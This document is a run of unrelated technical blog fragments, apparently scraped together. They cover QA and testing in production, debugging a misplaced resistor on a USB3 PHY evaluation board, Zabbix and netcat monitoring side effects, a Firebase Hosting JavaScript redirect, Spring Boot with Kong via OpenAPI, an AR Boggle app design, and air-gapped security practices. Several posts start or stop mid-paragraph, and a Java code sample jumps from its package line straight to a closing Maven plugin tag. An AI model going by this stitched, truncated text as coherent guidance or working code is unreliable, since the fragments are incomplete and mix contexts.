testing every deploy, and will inevitably block teams from deploying. That’s no
good. If you have manual tests, automate them and build them into your CI
pipeline (if they do deliver value).</p>

<p>Secondly, the teams doing QA often lack context and are under time pressure.
They may end up testing “effects” instead of “intents”. For example, I’ve seen
QA teams burn time testing that when something happens in a UI, something
related happens in a database. What happens when an engineer refactors that UI
component and changes the underlying data model? The functionality works, but
the test breaks. Because two teams are involved, this takes coordination and
time to fix. Similarly, I’ve seen QA teams block deploys because of failing
tests when caching was introduced at the CDN layer - a TTL of 5 seconds on an
activity feed may not ever be noticed by a user but it might break QA tests
causing unnecessary conflicts between product and QA engineers.</p>

<p>Luckily, solving this one is easy. Instead of having a dedicated QA team work
on creating manual and automated test cases that run in a fictitious QA
environment, reassign that team to work on continuous testing in production.
Instead of being a gate for deploys, a QA team could continuously verify that
production is working as expected. QA teams are also well situated to lead
Chaos Engineering initiatives, where faults are intentionally injected in
production. QA engineers could also work on making the CI/CD pipeline more
reliable, so that deploys are no longer a nightmare.</p>

0A 4A 0A 4A 0A 4A 0A 4A
</code></pre></div><p>This is interesting for two reasons:</p>
<ul>
<li>This PHY has geared inputs, and accepts two bytes of data at a time.</li>
<li>The incorrect values (<code>0A</code>) are off from the correct value (<code>4A</code>) by a single bit.</li>
</ul>
<p>Sure enough, modifying the data packet to send <code>FF</code> instead of <code>4A</code> pretty clearly shows off that missing bit:</p>
<div><pre><code data-lang="sh">BC BC BC BC <span>00</span> <span>00</span> BF FF
BF FF BF FF BF FF BF FF
</code></pre></div><p>At this point, I assumed that I'd gotten the pinout incorrect; and that I'd been writing to the wrong pin –
but careful examination of the documentation and my FPGA I/O definitions suggested that I had things right.
This suggested it was time to check things on the physical layer.</p>
<p>The board in question looks like this:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/board.jpg" alt="The PHY board, which features a notable long span of resistors, neatly tucked in parallel."> <figcaption>
            <h4>The AB07-USBFMC (slightly modified as detailed later).</h4>
        </figcaption>
</figure>

<p>Notably, there's a long series of what look like termination / signal conditioning resistors present at
the PHY boundary – and it looks like there's about 32 in total; which would make sense: 16 for transmit,
and 16 for receive.</p>
<p>A quick probe verifies that these are ~50R resistors, which would make a lot of sense for series termination:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/50r.jpg" alt="Multimeter showing a measurement of 47.5 ohms."> <figcaption>
            <h4>Sure looks like a series termination resistor.</h4>
        </figcaption>
</figure>

<p>This is excellent news, as it means that the signals are easily accessible without “voiding our warranty”,
which is a bit of a comfort when dealing with a rather expensive evaluation board.</p>
<p>So, as a next-step test, I had my FPGA squirt a 100MHz clock signal into every line on the transmit bus,
and probed the PHY side of one of those termination resistors:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/phy_tx_healthy.png" alt="A somewhat-rounded square wave, consistent with probing a 100MHz clock."> <figcaption>
            <h4>A nice, healthy wobble. AC coupled.</h4>
        </figcaption>
</figure>

<p>The frequency and amplitude of this signal are pretty in-line with what you'd expect: the amplitude corresponds
nicely to a decently healthy logic <code>1</code>. But how does the signal look on the problematic bit?</p>
<p>I adjusted the FPGA design so it only squirted a wave into the problematic bit; and probed in line until I found it:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/phy_tx_unhealthy.png" alt="A somewhat-rounded square wave, consistent with probing a 100MHz clock."> <figcaption>
            <h4>A *lot* less happy. Still AC couled for display.</h4>
        </figcaption>
</figure>

<p>Ut-oh. This signal's looking a lot less happy – and a lot more attenuated. At approximately 500mV peak,
you'd be hard pressed to consider this a logic <code>1</code>, even if you gave it your very best squint. There's no way
this thing would have worked in a test environment – which makes it seem very unlikely that this board was, y'know,
tested.</p>
<p>This immediately made me suspicious of the termination resistor sitting next to it; and apparently for good reason:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/larger_50r.jpg" alt="Multimeter showing a measurement of 396.0 ohms."> <figcaption>
            <h4>Quite possibly the largest 50 Ω I've ever seen.</h4>
        </figcaption>
</figure>

<p>This resistor is quite clearly supposed to be 50 Ω. It's also quite clearly <em>not</em> 50 Ω, despite sitting cleanly
in the middle of a row of 50 Ω resistors, and pretty much definitely the source of my problems.</p>
<p>So, naturally it's time to perform what I assume must be several hundred dollars worth of rework on this $1.65k board.
Luckily, I stock E24 0402s, so I had the resistor replaced with an appropriate value in no time.</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/happier.png" alt="Oscilloscope display of a corrected waveform."> <figcaption>
            <h4>Much happier. Note the amplitude.</h4>
        </figcaption>
</figure>

<p>With an appropriate value replaced, everything looks much happier – and everything works much more nicely.
Finally, our USB training sets look just the way they should:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/yay.png" alt="Analyzer display showing the correct value of our training set."> <figcaption>
            <h4>A correct Training Set, at last.</h4>
        </figcaption>
</figure>

<p>I'm planning on reaching out to Design Gateway – to at least let them know that this is an issue on some boards.
I'll update this post if/when I get a reply.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Lately, there has been a lot of discussion about SLAs, SLOs and SLIs. As <a href="https://cloud.google.com/solutions/defining-SLOs" rel="noopener noreferrer" target="_blank">this article</a> states, it is hard to define the correct SLOs and SLIs. This discussion is about what part of your services you want to monitor. But it is also difficult to measure these correctly. In this blog post I take a look at two examples of what can (and for us, did) go wrong in monitoring. This is about how you monitor your services.</p><h2>Example: TCP connections for monitored services</h2><p>The first example will be about TCP connections, a proxy, and handshakes.</p><h3>Expectation vs. reality</h3><p>For one of our projects we use an authentication proxy which is talking to an LDAP server as backend. We came across connections piling up on the server hosting this proxy. At first, it was not clear what was causing these connections.</p><p>After the proxy was installed, I integrated it into our Zabbix monitoring. To verify the proxy is answering requests, I used Zabbix’ built-in check <code>net.tcp.connect</code>. At first all seemed fine. The check was doing exactly what I expected.</p><p>But after a while we saw connections to the backend piling up on the server running the proxy. As no one was using the proxy for authentication at that point, I suspected Zabbix causing the vast number of connections. The monitoring of the service wasn’t working as expected. But what exactly was happening?</p><p>Each time Zabbix initiated the check, it was doing a three-way TCP handshake …</p><p><a href="https://blog.codecentric.de/files/2014/12/Selection_001.png"><img loading="lazy" src="https://blog.codecentric.de/files/2014/12/Selection_001-283x300.png" alt="TCP three-way-handshake" width="283" height="300" srcset="https://blog.codecentric.de/files/2014/12/Selection_001-283x300.png 283w, https://blog.codecentric.de/files/2014/12/Selection_001.png 462w" sizes="(max-width: 283px) 100vw, 283px"></a><br> Source: <a href="https://www.cs.purdue.edu/homes/park/cs536-e2e-3.pdf">https://www.cs.purdue.edu/homes/park/cs536-e2e-3.pdf</a></p><p>… and after that tore down the connection:<br> <a href="https://blog.codecentric.de/files/2014/12/Selection_002.png"><img loading="lazy" src="https://blog.codecentric.de/files/2014/12/Selection_002-281x300.png" alt="TCP connection tear down" width="281" height="300" srcset="https://blog.codecentric.de/files/2014/12/Selection_002-281x300.png 281w, https://blog.codecentric.de/files/2014/12/Selection_002.png 466w" sizes="(max-width: 281px) 100vw, 281px"></a><br> Source: <a href="https://www.cs.purdue.edu/homes/park/cs536-e2e-3.pdf">https://www.cs.purdue.edu/homes/park/cs536-e2e-3.pdf</a></p><p>In tcpdump, it looks like this:<br> <a href="https://blog.codecentric.de/files/2014/12/image04.png"><img loading="lazy" src="https://blog.codecentric.de/files/2014/12/image04-300x37.png" alt="TCP 3-way-handshake and tear down" width="300" height="37" srcset="https://blog.codecentric.de/files/2014/12/image04-300x37.png 300w, https://blog.codecentric.de/files/2014/12/image04-1024x127.png 1024w, https://blog.codecentric.de/files/2014/12/image04.png 1558w" sizes="(max-width: 300px) 100vw, 300px"></a></p><p>That was expected, so why were there so many connections still left on the system?</p><p>The proxy responded correctly, so the Zabbix check said everything is fine. But what happened on the connection from the proxy to the backend system?</p><p>It turned out, the proxy was starting a TLS connection to the backend for every incoming TCP connection. It did not matter to the proxy, there was no data sent. But the TLS connection to the backend should not be a problem either. It should have been torn down when the TCP connection from Zabbix to the Proxy ended. But that is theory. In reality the TLS connection even persisted after the correct TCP teardown:</p><p><a href="https://blog.codecentric.de/files/2014/12/image01.png"><img loading="lazy" src="https://blog.codecentric.de/files/2014/12/image01-300x71.png" alt="TLS handshake - 1" width="300" height="71" srcset="https://blog.codecentric.de/files/2014/12/image01-300x71.png 300w, https://blog.codecentric.de/files/2014/12/image01-1024x245.png 1024w, https://blog.codecentric.de/files/2014/12/image01.png 1567w" sizes="(max-width: 300px) 100vw, 300px"></a></p><h3>The Swiss army knife of networking</h3><p>So, I found the connections piling up on the proxy. But I still did not know what was the real problem. I tried to get a more precise view by connecting to the proxy manually with netcat: <code>nc -v backend.example.com 8636</code></p><p>But nothing happened. Each time I opened a connection with netcat to the proxy, it started a TLS connection to the backend. I closed netcat and after that, the proxy tore down the TLS connection to the backend. No connections piled up on the Proxy. What was different? After some more testing and man page reading I managed to reproduce the Zabbix behaviour with netcat: <code>nc -z -v backend.example.com 8636</code></p><p>The parameter that did the trick was <code>-z</code>. It instructs netcat to close the connection after a successful connect:</p><pre lang="”txt”">-z      Specifies that nc should just scan for listening daemons, 
        without sending any data to them. It is an error to use 
        this option in conjunction with the -l option.
</pre><p>So, it is not a problem specific to Zabbix, but it seems to be the Proxy. During the tests with netcat I observed, the problem didn’t appear when I used netcat in interactive mode.</p><p>Perhaps everything is a timing problem?</p><p>Netcat offers another handy parameter for these tests:</p><pre lang="”txt”">-w timeout
             Connections which cannot be established or are idle 
             timeout after timeout seconds. The -w flag has no 
             effect on the -l option, i.e. nc will listen forever
             for a connection, with or without the -w flag. 
             The default is no timeout.
</pre><p>So, I tried it again with <code>nc -w 1 -v control01.baremetal 8636</code> and it turned out, it works.</p><p>I did some more tests with this parameter and it worked without leftovers. Taking a closer look at the tcpdump traces, the TLS connection is not torn down when the initiating TCP connection to the Proxy ends before the TLS handshake finished. As soon as the TCP teardown sequence starts after the TLS handshake is done, the TLS connection also ended as expected(tcpdump view):</p><p><a href="https://blog.codecentric.de/files/2014/12/image00.png"><img loading="lazy" src="https://blog.codecentric.de/files/2014/12/image00-300x94.png" alt="TLS handshake - 2" width="300" height="94" srcset="https://blog.codecentric.de/files/2014/12/image00-300x94.png 300w, https://blog.codecentric.de/files/2014/12/image00-1024x321.png 1024w, https://blog.codecentric.de/files/2014/12/image00.png 1566w" sizes="(max-width: 300px) 100vw, 300px"></a></p><h3>Monitoring the service</h3><p>So, I used the netcat command to create a new Zabbix check with the slowed down TCP disconnect. It is not the perfect solution, but works fine for my situation.</p><p>To be complete, implementing the check for Zabbix did not work without problems. In short, it showed Zabbix also needs the parameter <code>-d</code>. Otherwise, it does something weird with stdin and the parameter <code>-w 1</code> has no effect.</p><h2>Example: State of a monitored service</h2><p>This is another example of an application we monitor. There we monitored the availability and response time of an HTTP endpoint. The first approach was a simple HTTP GET showing these response times:</p><p><a href="https://blog.codecentric.de/files/2020/11/Screenshot-2020-11-10-08_10_07.png"><img loading="lazy" width="250" height="40" src="https://blog.codecentric.de/files/2020/11/Screenshot-2020-11-10-08_10_07-250x40.png" alt="Pile Up of monitored response times" srcset="https://blog.codecentric.de/files/2020/11/Screenshot-2020-11-10-08_10_07-250x40.png 250w, https://blog.codecentric.de/files/2020/11/Screenshot-2020-11-10-08_10_07-700x112.png 700w, https://blog.codecentric.de/files/2020/11/Screenshot-2020-11-10-08_10_07-768x123.png 768w, https://blog.codecentric.de/files/2020/11/Screenshot-2020-11-10-08_10_07-1536x246.png 1536w, https://blog.codecentric.de/files/2020/11/Screenshot-2020-11-10-08_10_07-120x19.png 120w, https://blog.codecentric.de/files/2020/11/Screenshot-2020-11-10-08_10_07.png 1670w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p>As you can see in the graph above, the response time piled up the more we queried the endpoint.</p><p>As it turned out, the application held a state associated with the endpoint. Be surprised, but not everything is stateless. This state grew bigger and bigger each time we queried the endpoint. Therefore, it took the application longer and longer to process our requests. The session timeout was too long, to discard the session between the monitoring queries.</p><p>The application had to be modified, so that it does not create a session for the endpoints used for monitoring. This is just an example and might also happen with disk space, memory, or CPU consumption.</p><h2>Conclusion</h2><p>Not only is it hard to define SLOs/SLIs and define the correct measures for a user perspective. As shown with these examples, it is also hard to monitor the services correctly without impacting the selected SLOs with your measurement. It’s crucial not to only know what service to monitor, but also how to monitor this service. <a href="https://en.wikipedia.org/wiki/Observer_effect_(physics)" rel="noopener noreferrer" target="_blank">The Observer effect</a> is not only applicable to quantum physics.</p></div></div>]]>

<p>Did you ever need to redirect the default URL of firebase hosting to a custom URL? You may ask me why do you need to do so. There are a couple of cases that we need to do so. I’m going to explain a scenario that I’ve needed to redirect the default URL to a custom URL in Firebase Hosting.</p>
<p>My client asked me to host his web site on Firebase Hosting and at that time he was not configured with the proper domain name. So I deployed his website and I gave him the deployed URL something like https://myapp.firebaseapp.com. So he was happy and shared that with few people that need that to test. A few days later he configured his proper domain name in firebase hosting and it is working perfectly. But the problem is the default URL that I have shared with him previously also working. He wanted to redirect that URL to the custom domain that he configured. </p>

<p>The problem here is firebase does not allow to cancel or redirect the default URL. So adding redirects in firebase.json won’t work. So we have to do it on our own. The simplest way that I realize is to do the redirection with JavaScript. So what you have to do is adding the below script to the bottom of your index.html page.</p>
<pre><code lang="javascript">&lt;script type="text/javascript"&gt;
        if (location.hostname.indexOf('custom.domain') === -1) {
            location.replace("https://custom.domain");
        }
&lt;/script&gt;</code></pre>
<p>What this script does is if the URL hostname is not equal to our custom domain the rewrite the URL to the custom domain. This method works for all the browsers that enabled the JavaScript.</p>
<p>Hope this will help you if you had to face the same situation as me. You can see more details <a href="https://stackoverflow.com/questions/34212039/redirect-to-firebase-hosting-custom-domain">here</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>No matter what architecture you’re planning to build: an API Gateway is mostly part of a modern setup. So why not connect your Spring Boot apps with Kong API Gateway using a standard like OpenAPI and configuration-as-code?!</p><h2>Finding a good way to integrate</h2><p>I have to admit that I’am a little late to the party. Many of my colleagues have already written <a href="https://blog.codecentric.de/en/?s=kong">posts on Kong API Gateway on our codecentric blog</a>. If you want to read more about <a href="https://github.com/Kong/kong">Kong as an API Gateway</a>, I can recommend having a look. Getting involved has been on my list for a long time. So here we go. 🙂</p><p><a href="https://blog.codecentric.de/files/2020/11/spring-boot-kong-logos.png"><img loading="lazy" width="250" height="67" src="https://blog.codecentric.de/files/2020/11/spring-boot-kong-logos-250x67.png" alt="Spring Boot connected with Kong" srcset="https://blog.codecentric.de/files/2020/11/spring-boot-kong-logos-250x67.png 250w, https://blog.codecentric.de/files/2020/11/spring-boot-kong-logos-700x187.png 700w, https://blog.codecentric.de/files/2020/11/spring-boot-kong-logos-768x205.png 768w, https://blog.codecentric.de/files/2020/11/spring-boot-kong-logos-120x32.png 120w, https://blog.codecentric.de/files/2020/11/spring-boot-kong-logos.png 1534w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p>Logo sources: <a href="https://github.com/Kong/kong" target="_blank" rel="noopener noreferrer">Kong logo</a>, <a href="https://spring.io/projects/spring-boot" rel="noopener noreferrer" target="_blank">Spring Boot logo</a></p><p>I always want to know how I can integrate new technologies into my tool belt. So why not try to integrate Kong as an API Gateway for Spring Boot Apps? Maybe that’s also a problem you have, since you landed here on this article. And it shouldn’t be a big problem, right? Hmm, googling around, I wasn’t convinced about the solutions I found.</p><p>Many of the implementations <strong>needed code changes</strong> or the usage of custom annotations on the Spring side in order to do the integration. A lot of them relying on libraries with a suspiciously small user base. Or I found many articles describing <strong>manual steps</strong>, where I would need to click on this and that in order to connect my app with Kong. None of these approaches really seem to work out in the long run. So I began to dive a bit deeper into the topic. And I developed some <strong>requirements for the solution I was trying to find</strong>:</p><p><strong>1.</strong> There <strong>shouldn’t be any need to change the code</strong> of my Spring app! Since there’s no silver bullet, I always want to be able to use other tools with minimal effort if my requirements change. And I also want to integrate my existing Spring Boot apps into the API Gateway seamlessly.<br> <strong>2.</strong> I had no clue about Kong, but I wanted to use it really as any other tool that is able to remain in my toolbelt: <strong>It should be configurable 100% by code</strong> – so that no clicks will be needed at all.<br> <strong>3.</strong> Many posts about Kong involve a huge Docker Compose file with 3 to 4 services solely needed to fire up a API Gateway instance. I like full-blown setups for production use, but I wanted to have <strong>a setup where Kong only needs one service</strong> – like other solutions I saw with for example <a href="https://spring.io/projects/spring-cloud-gateway" rel="noopener noreferrer" target="_blank">Spring Cloud Gateway</a> or <a href="https://traefik.io/traefik/" rel="noopener noreferrer" target="_blank">Traefik</a>.<br> <strong>4.</strong> The <strong>integration of Spring Boot and Kong should be fully automated</strong>. Since code is here to change, every change affecting my app’s REST interface should be reflected automatically in the API Gateway. And I want to be able to automatically verify that in my CI/CD pipeline.</p><h2>The setup</h2><h2><p>Finally I found a setup that should work for many use cases and would also meet my requirements. Let’s take a look onto the following diagram:</p><p><a href="https://blog.codecentric.de/files/2020/11/blog-post-setup.png"><img loading="lazy" width="250" height="39" src="https://blog.codecentric.de/files/2020/11/blog-post-setup-250x39.png" alt="the setup of the blog post using OpenAPI &amp; Insomnia Inso" srcset="https://blog.codecentric.de/files/2020/11/blog-post-setup-250x39.png 250w, https://blog.codecentric.de/files/2020/11/blog-post-setup-700x109.png 700w, https://blog.codecentric.de/files/2020/11/blog-post-setup-768x119.png 768w, https://blog.codecentric.de/files/2020/11/blog-post-setup-1536x238.png 1536w, https://blog.codecentric.de/files/2020/11/blog-post-setup-2048x318.png 2048w, https://blog.codecentric.de/files/2020/11/blog-post-setup-120x19.png 120w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p>Logo sources: <a href="https://www.openapis.org/" rel="noopener noreferrer" target="_blank">OpenAPI logo</a>, <a href="https://github.com/Kong/kong" rel="noopener noreferrer" target="_blank">Kong logo</a>, <a href="https://insomnia.rest/" rel="noopener noreferrer" target="_blank">Insomnia logo</a>, <a href="https://github.com/Kong/insomnia/tree/develop/packages/insomnia-inso" rel="noopener noreferrer" target="_blank">Inso logo</a></p><p>So the idea is to <strong>use <a href="https://www.openapis.org/" rel="noopener noreferrer" target="_blank">OpenAPI</a> as the integration glue</strong> here. I think that’s a great specification – even without using an API Gateway. Maybe it’s even already there in your project?! In order to simplify the usage of OpenAPI with Spring, there’s the great <a href="https://github.com/springdoc/springdoc-openapi" rel="noopener noreferrer" target="_blank">springdoc-openapi</a> project which we’ll use in our setup.</p><p>In addition, we’ll also focus on <strong><a href="https://docs.konghq.com/latest/db-less-and-declarative-config" rel="noopener noreferrer" target="_blank">Kong’s Declarative Configuration option</a></strong>. This will have a bunch of benefits. First, this approach enables us to use Kong as fully configurable by code. It also enables a really elegant setup, where we only need one single Kong service – since there’s also a DB-less mode, where Kong doesn’t need any database. And finally using the <a href="https://github.com/Kong/insomnia/tree/develop/packages/insomnia-inso#-inso-generate-config-identifier" rel="noopener noreferrer" target="_blank">openapi-2-kong functionality of the Insomnia CLI (“Inso”)</a> we can directly <strong>generate the Kong Declarative Configuration file from our OpenAPI specification</strong> that is derived from our Spring Boot REST API. As we don’t want to get a headache by using too many buzzwords, we should get our hands dirty and simply build this setup from the ground up! To really be able to comprehend every single step, you may also want to look into <a href="https://github.com/jonashackt/spring-boot-openapi-kong" rel="noopener noreferrer" target="_blank">the example project on GitHub</a>.</p></h2><h2>Creating a Spring Boot app or choose an existing one</h2><p>This is the easy part. We all know where to start if we want to kick off a new Spring Boot project. <strong>Go to <a href="https://start.spring.io/" rel="noopener noreferrer" target="_blank">start.spring.io</a></strong> and generate a Spring REST app skeleton matching your needs. You may also choose one of your existing apps to start with. I simply took the <code>weatherbackend</code> app from this <a href="https://github.com/jonashackt/cxf-spring-cloud-netflix-docker" rel="noopener noreferrer" target="_blank">Spring Cloud-based project</a>, which was part of <a href="https://blog.codecentric.de/en/2017/05/ansible-docker-windows-containers-scaling-spring-cloud-netflix-docker-compose/" rel="noopener noreferrer" target="_blank">a blog post I wrote in 2017 about a Spring Cloud Netflix-stack-based setup</a>. Additionally I also wanted to get a feeling for the differences between the setup back then compared to the usage of Kong API Gateway today.</p><p>The <code>weatherbackend</code> Spring Boot app is using standard dependencies like <a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web" rel="noopener noreferrer" target="_blank">spring-boot-starter-web</a> to implement some Spring MVC based REST endpoints. The class <a href="https://github.com/jonashackt/spring-boot-openapi-kong/blob/main/weatherbackend/src/main/java/io/jonashackt/weatherbackend/api/WeatherBackendAPI.java" rel="noopener noreferrer" target="_blank">WeatherBackendAPI.java</a> looks like something you would expect:</p><div><div><pre><span>package</span> <span>io.jonashackt.weatherbackend.api</span><span>;</span>

<span><span>&lt;/plugin<span>&gt;</span></span></span></pre></div></div><p>As you see, we also need to tell the <code>spring-boot-maven-plugin</code> to start and stop the integration test phases, since the <code>springdoc-openapi-maven-plugin</code> will use the live documentation of a running Spring Boot app to generate the OpenAPI spec file. In order to finally generate the file, simply execute Maven with: <code>mvn verify</code>. The output should look like this:</p><div><div><pre>...
<span>[</span>INFO<span>]</span> <span>---</span> springdoc-openapi-maven-plugin:<span>1.1</span>:generate <span>(</span>default<span>)</span> <span>@</span> hellobackend <span>---</span>

...</pre></div></div><p>This indicates that the OpenAPI spec generation was successful. Therefore, we need to take a look into the <code>weatherbackend/target</code> directory, where a file called <code>openapi.json</code> should be present now. <strong>And this is great news!</strong> Without changing any code, we generated our OpenAPI spec file. 🙂</p><h2>Tweak the API information in the generated OpenAPI spec</h2><p>We could just go on with that <code>openapi.json</code> file, but we may want to tweak it slightly. Since if we move forward, we will notice that some information should be changed <strong>to achieve a better integration into Kong</strong>. Especially the element <code>"title": "OpenAPI definition"</code> is later used as the Kong service name. Also the element <code>"url": "http://localhost:8080"</code> is used to configure the upstream service endpoint <code>protocol</code>, <code>host</code> and <code>port</code> inside the Kong service definition.</p><p>I know that “this is code”. But again <strong>we don’t need to change any existing code</strong> and we don’t need to introduce new classes/annotations into our normal Spring code. We simply create a new separate class that uses <a href="https://github.com/springdoc/springdoc-openapi#adding-api-information-and-security-documentation" rel="noopener noreferrer" target="_blank">the @OpenAPIDefinition annotation</a> to configure the needed service info. So let’s create a class like <a href="https://github.com/jonashackt/spring-boot-openapi-kong/blob/main/weatherbackend/src/main/java/io/jonashackt/weatherbackend/api/OpenAPIConfig.java" rel="noopener noreferrer" target="_blank">OpenAPIConfig.java</a> that looks as follows:</p><div><div><pre><span>package</span> <span>io.jonashackt.weatherbackend.api</span><span>;</span>
&nbsp;
<span>import</span> <span>io.swagger.v3.oas.annotations.OpenAPIDefinition</span><span>;</span>
<span>import</span> <span>io.swagger.v3.oas.annotations.info.Info</span><span>;</span>

                <div><p>During the summer of 2019, I received a Facebook message from Roboflow co-founder <a href="https://twitter.com/braddwyer">Brad Dwyer</a> asking me if I wanted to design a new mobile app he was working on. His previous app, <a href="https://magicsudoku.com/">Magic Sudoku</a>, had recently generated some buzz online and even won a <a href="https://blog.producthunt.com/golden-kitty-awards-winners-7c2628e5f429">Golden Kitty award from Product Hunt</a>, so he was excited to build another app using Apple's ARKit.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/FH30v5kCWAw?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>Video version of this post: don't forget to <a href="https://bit.ly/rf-yt-sub">subscribe</a>!</figcaption></figure><p>At the beginning of our meeting, Brad placed a Boggle box in front of me and said he wanted to experiment with augmented reality in the board game space. His vision was to blend the the experience of playing board games on your phone with the experience of playing a physical board game with friends. </p><h3 id="research">Research</h3><figure><img src="https://blog.roboflow.com/content/images/2020/10/discovery01.jpg" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/10/discovery01.jpg 600w, https://blog.roboflow.com/content/images/size/w1000/2020/10/discovery01.jpg 1000w, https://blog.roboflow.com/content/images/size/w1600/2020/10/discovery01.jpg 1600w, https://blog.roboflow.com/content/images/size/w2400/2020/10/discovery01.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>There are so many ways to play Boggle.</figcaption></figure><figure><img src="https://blog.roboflow.com/content/images/2020/10/discovery02.jpg" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/10/discovery02.jpg 600w, https://blog.roboflow.com/content/images/size/w1000/2020/10/discovery02.jpg 1000w, https://blog.roboflow.com/content/images/2020/10/discovery02.jpg 1329w" sizes="(min-width: 720px) 720px"></figure><p>My first step was to buy Boggle and start playing it regularly. I also began researching different ways you can play Boggle, including all the variations sold by Hasbro, both physical and digital. I even watched old clips of a <a href="https://www.youtube.com/watch?v=EbxlB67nnmM">short-lived Boggle game show</a> from the '90s on Youtube.</p><h3 id="first-design-iteration-where-s-the-augmented-reality">First Design Iteration - Where's the Augmented Reality?</h3><p>I have designed many mobile apps over the years, but this was my first foray into augmented reality. From our initial research and our time spent playing the game, Brad and I identified some pretty obvious pain points.</p><ol><li>There’s no way quick way to identify words you’ve missed unless you type all the letters into an <a href="http://fuzzylogicinc.net/boggle/">online Boggle solver</a>.</li><li>It takes a significant amount of time to read your words out loud and score them.</li><li>It can be a pain to challenge words from other players if you aren’t familiar with the Boggle dictionary.</li></ol><p>The main requirement was to use <a href="https://blog.roboflow.com/creating-boardboss-a-mobile-application-that-improves-boggle/">computer vision to scan the letters</a> in the grid and provide a list of all possible words. I was still learning the capabilities of ARKit so, initially, I didn’t spend a lot of time designing the AR experience. I played it safe and designed a simple Boggle app that listed all the possible words, provided a 3-minute timer, and gave users the ability to enter their scores after each round. </p><figure><img src="https://blog.roboflow.com/content/images/2020/10/i1-screens.jpg" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/10/i1-screens.jpg 600w, https://blog.roboflow.com/content/images/size/w1000/2020/10/i1-screens.jpg 1000w, https://blog.roboflow.com/content/images/2020/10/i1-screens.jpg 1200w" sizes="(min-width: 720px) 720px"><figcaption>My first iteration was too light on augmented reality.</figcaption></figure><p>At this point, my designs were fulfilling Brad’s main requirement of including a computer vision component, but the app wasn’t really differentiating itself from other scorekeeping apps. Brad’s feedback was to go all in on the AR experience and come up with something he wasn’t even sure he could build.</p><h3 id="second-design-iteration-let-s-visualize-some-data">Second Design Iteration - Let's Visualize Some Data</h3><p>During my initial research, I found a great article <a href="http://thebogglers.blogspot.com/2008/06/my-boggle-strategy-fwiw.html">full of tips for improving your Boggle score</a>. It instructed players to look for common groups of letters and memorize all the various words that stem from those groups.</p><figure><img src="https://blog.roboflow.com/content/images/2020/10/i2---inspiration.jpg" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/10/i2---inspiration.jpg 600w, https://blog.roboflow.com/content/images/size/w1000/2020/10/i2---inspiration.jpg 1000w, https://blog.roboflow.com/content/images/2020/10/i2---inspiration.jpg 1200w" sizes="(min-width: 720px) 720px"><figcaption>My AR concepts were inspired by data visualization imagery I found online.</figcaption></figure><p>With AR, I realized we could use the letters on the grid to do more than just list out all the possible words.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>Security is an illusion, especially with computers. The systems are so complex, handled by so many different people that nobody really has a good idea of how everything works. Even the best specialists have knowledge gaps: software, hardware, etc… This creates a security nightmare: breaking stuff is trivial, fixing the systems is nearly impossible.</p>
<h2 id="high-security-systems-still-exist">High Security Systems Still Exist</h2>
<p>There are systems that are protected against nearly all attacks. <strong>Their main philosophy is not to fix the security issues but to prevent an attacker from accessing the system in the first place.</strong> You can’t hack something that’s not there. However these systems are painful to use, especially for their lack of internet connection. Here are the main techniques used in a high security system:</p>
<ul>
<li>
<p><strong>Air Gapping</strong>: The device can’t connect to anything that is not physically plugged into it. No internet, wifi, bluetooth, speaker, microphone, webcam. Anything that can communicate with the outside world is physically removed from the electronic device.</p>
</li>
<li>
<p><strong>Non Contamination Protocol</strong>: Air Gapping is not sufficient (<a href="https://en.wikipedia.org/wiki/Stuxnet">stuxnet</a> is a good example of why it isn’t). Everything plugged into the air gapped device (like usb keys) can’t be plugged anywhere else. No exceptions. This prevents any information from getting out. I would even recommend not to plug anything that comes from another device (stuff like stuxnet or ransomware can still make some damage).</p>
</li>
<li>
<p><strong>Physical Protection</strong>: Non-contaminated air gapped devices are impossible to attack remotely. The only way is to access them physically. Having the electronic device hidden in a place that is difficult to access (e.g. in a safe) will protect it better.</p>
</li>
<li>
<p><strong>Full Disk Encryption</strong>: Physical Protection is not foolproof. An attacker can still get access to it with enough resources. To protect the information inside your device, encrypt its entire content. Not all types of encryption are made equal, we will talk about it later in this article.</p>
</li>
<li>
<p><strong>Tamper Evident System</strong>: The last remaining attack on an electronic device, after you’ve already used all of the above techniques, is to tamper it. The main goal is to access the encryption key when it is entered. Using tamper evident techniques (hardware and software) will alert you that somebody has modified your device to access your password (more about it in Two Layers of Encryption below).</p>
</li>
<li>
<p><strong>Backup</strong>: The last remaining problem is system failure. As long as your backups follow all of the above techniques, you can have as many as you want. Store them in a different location for increased safety.</p>
</li>
</ul>
<p><strong>Security is more about how you use the hardware/software rather than having a secure device in itself. It’s more about protocol than technology.</strong></p>
<p>I have seen classified environment with less security than the one just presented. Using a device with all of the above techniques will guarantee an electronic fortress. However this creates a big problem: <strong>you become the information’s weak link</strong>. It means that an attacker will no longer try to hack or decrypt your device, but instead will threaten you in order to access the information inside it.</p>
<h2 id="plausible-deniability">Plausible Deniability</h2>
<p><img src="https://www.alvarez.io/img/color/2FE.png" alt="Rubber-hose cryptanalysis">
